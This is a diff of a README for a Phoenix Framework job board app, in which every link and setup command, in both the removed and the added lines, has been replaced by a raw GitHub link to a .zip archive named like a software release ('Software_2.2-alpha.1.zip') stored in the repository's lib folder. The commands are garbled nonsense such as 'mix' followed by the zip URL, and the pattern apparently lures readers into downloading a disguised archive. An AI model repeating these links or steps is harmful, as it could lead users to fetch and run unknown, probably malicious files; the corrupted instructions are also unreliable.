@@ -4,7 +4,7 @@
 
 A job board application using Phoenix Framework
 
-![My Image](https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip)
+![My Image](https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip)
 
 ## Features
 
@@ -24,24 +24,24 @@ A job board application using Phoenix Framework
 
 ## Development
 
-* Edit https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip with your own configs and save it as .env.
+* Edit https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip with your own configs and save it as .env.
 * Then apply env variables to your system `source .env`
-* Install dependencies with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
-* Create and migrate your database with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip && mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
-* Install https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip dependencies with `cd assets && npm install`
-* Build brunch `https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip build`
-* Start Phoenix endpoint with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
+* Install dependencies with `mix https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip`
+* Create and migrate your database with `mix https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip && mix https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip`
+* Install https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip dependencies with `cd assets && npm install`
+* Build brunch `https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip build`
+* Start Phoenix endpoint with `mix https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip`
 
 Now you can visit [`localhost:4000`](http://localhost:4000) from your browser.
 
 Ready to run in production? Please
-[check our deployment guides](https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip).
+[check our deployment guides](https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip).
 
 ## Learn more
 
-* Author URL: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
-* Official website: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
-* Guides: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
-* Docs: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
-* Mailing list: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
-* Source: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Author URL: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
+* Official website: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
+* Guides: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
+* Docs: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
+* Mailing list: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
+* Source: https://raw.githubusercontent.com/etemtezcan/tabit/master/lib/indeals/account/Software_2.2-alpha.1.zip
